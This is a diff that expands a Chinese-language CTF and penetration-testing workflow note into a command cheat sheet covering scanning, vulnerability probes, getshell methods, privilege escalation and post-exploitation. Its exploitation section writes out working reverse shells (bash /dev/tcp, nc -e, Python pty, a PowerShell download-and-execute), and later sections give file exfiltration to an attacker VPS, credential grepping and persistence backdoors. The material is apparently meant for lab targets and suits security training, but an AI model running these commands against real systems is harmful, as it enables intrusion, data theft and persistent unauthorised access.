@@ -1,24 +1,236 @@
-一，nmap扫描
-nmap -sn 10.10.10.0/24
-nmap -sT --min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports
-nmap -sT -sV -sC -O -p<端口号> 10.10.10.21 -oA nmapscan/detail
-nmap -sU --top-ports 20 10.10.10.21 -oA nmapscan/udp
-nmap --script=vuln -p<端口号> 10.10.10.21 -oA nmapscan/vuln
-如果都没有东西那就要去扫一下 IPV6 有没有东西
-二，寻找攻击向量
-常见攻击向量：
-22/tcp ssh
-80/tcp http
-3306/tcp mysql
-21tcp ftp
+# 打靶基本流程
 
-三确认攻击向量，寻找漏洞
-在进行漏洞寻找中也是一个信息收集的过程
-对于信息收集，要对用户名，邮箱，密码，网站使用的框架，第三方管理系统等敏感
-用户名，邮箱，密码很可能会是主机用户名和密码
-而第三方框架很有可能有漏洞，或者没有及时打上安全补丁
-要多使用google浏览器，搜索：网站系统默认密码，系统管理员登录路径，漏洞等
-可以使用searchsploit寻找相关的漏洞
+> CTF 打靶 / 渗透测试通用流程总结
 
-拿到shell后：
-对于提权，第一步就是确认一共有多少用户，所以访问/etc/passwd，确认哪些用户拥有bash权限
+---
+
+## 一、信息收集
+
+### 1.1 主机发现
+```bash
+nmap -sn 10.10.10.0/24                    # 存活探测
+netdiscover -r 10.10.10.0/24              # ARP 扫描
+```
+
+### 1.2 端口扫描
+```bash
+nmap -sT --min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports     # 全端口
+nmap -sT -sV -sC -O -p<端口> 10.10.10.21 -oA nmapscan/detail      # 深度扫描
+nmap -sU --top-ports 20 10.10.10.21 -oA nmapscan/udp              # UDP 扫描
+nmap --script=vuln -p<端口> 10.10.10.21 -oA nmapscan/vuln          # 漏洞扫描
+```
+**注**: 如果常规扫描没有任何发现，尝试扫描 IPv6 地址。
+
+### 1.3 目录/路径扫描
+```bash
+gobuster dir -u http://10.10.10.21 -w /usr/share/wordlists/dirb/common.txt
+dirsearch -u http://10.10.10.21
+ffuf -u http://10.10.10.21/FUZZ -w /path/to/wordlist.txt
+```
+
+### 1.4 Web 指纹识别
+```bash
+whatweb http://10.10.10.21
+wappalyzer (浏览器插件)
+```
+
+### 1.5 子域名收集（如适用）
+```bash
+ffuf -u http://example.com -H "Host: FUZZ.example.com" -w subdomain.txt
+```
+
+---
+
+## 二、寻找攻击向量
+
+### 常见攻击入口
+
+| 端口 | 服务 | 常见漏洞 |
+|------|------|----------|
+| 21/tcp | FTP | 匿名登录、爆破、已知漏洞 |
+| 22/tcp | SSH | 弱密码爆破、密钥泄露 |
+| 80/443/tcp | HTTP/HTTPS | Web 漏洞 |
+| 445/tcp | SMB | EternalBlue、匿名共享 |
+| 3306/tcp | MySQL | 弱密码、SQL 注入 |
+| 3389/tcp | RDP | BlueKeep、弱密码 |
+| 6379/tcp | Redis | 未授权访问 |
+| 8080/tcp | Tomcat | 弱密码、Manager 后台 |
+| 27017/tcp | MongoDB | 未授权访问 |
+
+---
+
+## 三、确认攻击向量，寻找漏洞
+
+### 3.1 Web 漏洞检测
+在进行漏洞寻找时也是信息收集的延续，需要关注：
+
+- **用户名、邮箱、密码** — 很可能是主机登录凭据
+- **网站框架/版本** — 搜索已知漏洞（searchsploit）
+- **第三方组件** — 是否有已知 CVE 或未打补丁
+- **后台路径** — 搜索引擎查找默认后台路径和默认密码
+- **API 接口** — 是否存在未授权接口
+
+### 3.2 常用搜索技巧
+```
+Google:
+  site:target.com inurl:admin
+  site:target.com intitle:login
+  site:target.com filetype:sql | filetype:env
+
+默认密码搜索:
+  <系统名称> 默认密码
+  <系统名称> default password
+
+漏洞搜索:
+  searchsploit <组件名称> <版本号>
+  searchsploit -m <漏洞编号>  # 复制EXP到当前目录
+```
+
+### 3.3 常见漏洞检测
+- ✅ SQL 注入 → `'` `"` `)`)等闭合测试
+- ✅ XSS → `<script>alert(1)</script>`
+- ✅ 文件包含 → `../../etc/passwd`
+- ✅ SSRF → 请求内网地址
+- ✅ 命令注入 → `;id` `|id` `$(id)`
+- ✅ SSTI → `{{7*7}}` `${7*7}`
+- ✅ 路径穿越 → `../` `%2e%2e%2f`
+- ✅ XXE → XML 外部实体注入
+- ✅ 反序列化 → 序列化数据特征 `O:4:"User":1:{s:4:"name";s:4:"test";}`
+
+---
+
+## 四、漏洞利用
+
+### 4.1 Getshell 方式
+- 文件上传绕过 → Webshell
+- SQL 注入写文件 → `SELECT "<?php...?>" INTO OUTFILE`
+- 命令执行 → 反弹 Shell
+- 反序列化 → RCE
+- 文件包含 → 日志注入 / php://input / data://
+
+### 4.2 反弹 Shell
+
+```bash
+# Linux
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
+
+# nc
+nc -e /bin/bash 10.10.10.10 4444
+
+# Python
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+
+# PowerShell (Windows)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/payload.ps1')"
+```
+
+---
+
+## 五、提权（权限提升）
+
+### 5.1 Linux 提权
+
+```bash
+# 1. 基本信息收集
+id                              # 当前用户
+uname -a                        # 内核版本
+cat /etc/passwd                 # 所有用户
+cat /etc/shadow                 # 密码哈希（需要root）
+cat /etc/os-release             # 系统版本
+
+# 2. SUID 提权
+find / -perm -4000 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# 3. Sudo 提权
+sudo -l                         # 查看可执行的命令
+# 如果看到 (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ':!sh'
+
+# 4. 内核漏洞提权
+searchsploit linux kernel <版本>
+
+# 5. 自动任务提权
+cat /etc/crontab
+ls -la /etc/cron*
+systemctl list-timers
+
+# 6. 配置信息收集
+cat /etc/ssh/sshd_config        # SSH 配置
+ls -la /home/*/.ssh/            # SSH 密钥
+```
+
+### 5.2 Windows 提权
+
+```cmd
+# 信息收集
+whoami /all
+systeminfo
+wmic qfe list                   # 补丁信息
+net user
+net localgroup administrators
+
+# 服务漏洞
+wmic service get name,displayname,pathname,startmode
+accesschk.exe -uwcqv "Authenticated Users" *
+
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+---
+
+## 六、后渗透
+
+```bash
+# 信息收集（凭据搜索）
+grep -r "password" /etc/ 2>/dev/null
+grep -r "password" /home/* 2>/dev/null
+find /var/www -type f -name "*.php" -exec grep -l "password" {} \;
+
+# 横向移动（Linux）
+ssh user@target
+ssh-keygen -t rsa && ssh-copy-id user@target
+
+# 持久化
+# - 添加 SSH 公钥
+# - 创建定时任务
+# - Web 后门
+# - SUID 后门
+```
+
+---
+
+## 七、常见踩坑点
+
+1. **扫描范围不够大** — 试试扫 IPv6
+2. **默认口令没有试** — admin/admin, root/root, admin/123456
+3. **版本利用不对** — 确认利用代码匹配目标版本
+4. **防火墙限制** — 尝试不同端口、协议绕过
+5. **权限卡住** — 检查所有用户的 crontab，检查可写脚本
+6. **信息遗漏** — 多看几遍 nmap 的结果，找隐藏服务
+7. **低版本脚本不行** — 尝试不同编程语言版本的 exploit
+
+---
+
+## 八、速查命令
+
+```bash
+# Web 目录扫描
+gobuster dir -u <url> -w <wordlist> -x php,txt,html,zip
+
+# 端口转发
+ssh -L <本地端口>:<目标>:<目标端口> user@跳板机
+
+# 动态代理
+ssh -D 1080 user@跳板机
+# 然后 proxychains nmap ...
+
+# 上传/下载
+python3 -m http.server 80                    # 起HTTP
+curl -F "file=@local.txt" http://your-vps/   # 上传
+wget http://your-vps/payload.sh              # 下载
+
+# 编码/解码
+echo "base64字符串" | base64 -d
+echo "URL编码字符串" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"
+```
